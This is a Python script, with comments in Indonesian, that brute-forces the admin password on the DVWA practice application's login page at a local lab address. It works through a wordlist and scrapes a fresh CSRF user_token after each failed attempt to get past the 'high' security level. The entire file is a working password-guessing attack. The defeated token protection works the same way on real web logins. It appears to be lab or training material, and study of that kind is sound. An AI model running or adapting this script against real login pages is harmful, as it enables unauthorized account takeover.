#!/usr/bin/python3
#Author: Rizki Triyanto

from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

# argumen yang nanti akan digunakan
script, wordlistdir, success_message = argv
txt = open(wordlistdir)

# setup target, cookie and session
url = 'http://192.168.1.5/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': 'fv41a97e716jae3njb7acdhbg6'}
target = requests.Session()
target_page = target.get(url, cookies=cookie)


# Mencari HTML response untuk pesan sukses
def checkSuccess(html):
    soup = Soup(html, features="lxml")
    search = soup.findAll(text=success_message)

    if not search:
        success = False

    else:
        success = True

# mengembalikan hasil bruteforce
    return success


# Mengambil CSRF token dari target memanfaatkan library Soup untuk mencari
page_source = target_page.text
soup = Soup(page_source, features="lxml")
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

# Menampilkan URL
print('DVWA URL= ' + url)


# Looping sesuai isi wordlist
with open(wordlistdir) as wordlist:
    print('Sedang menjalankan brute force attack...')
    for password in wordlist:

        # Menampilkan password yang dicoba dan CSRF Token
        print('CSRF Token= ' + csrf_token)
        print('password yang dicoba: ' + password)
        password = password.strip()

        # setup payload
        payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
        r = target.get(url, cookies=cookie, params=payload)
        success = checkSuccess(r.text)

        if not success:
            # ketika gagal CSRF Token akan diganti
            soup = Soup(r.text, features="lxml")
            csrf_token = soup.findAll(attrs={"name": "user_token"})[
                0].get('value')
        else:
            # Kalau berhasil. Pasword ditampilkan
            print('Berhasil !!! Password =  ' + password)
            break

# Gagal
    if not success:
        print('Brute force gagal. Password tidak ada di wordlist.')
